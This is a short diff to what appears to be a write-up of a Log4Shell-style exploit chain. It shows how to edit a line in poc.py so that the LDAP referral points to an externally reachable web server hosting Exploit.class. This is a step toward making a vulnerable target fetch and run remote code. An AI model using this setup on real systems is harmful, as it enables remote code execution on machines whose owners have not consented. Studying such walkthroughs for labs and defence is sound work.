@@ -96,3 +96,11 @@ Send LDAP reference result for a redirecting to http://localhost:8000/Exploit.cl
 ```
 
 The localhost servers are already ported, but as you can see, the chat application is still on localhost.
+Upon inspection of `poc.py`, we see that this line is responsible:
+
+ 
+ ​  `  ​url​ ​=​ ​"http://{}:{}/#Exploit"​.​format​(​userip​, ​lport​)`
+So we can change that yo our Web server url (the one running 8000 on local host.)
+ 
+ ​   ` ​url​ ​=​ ​"http://{}/#Exploit"​.​format​(​"<WEB SERVER URL HERE>")`
+
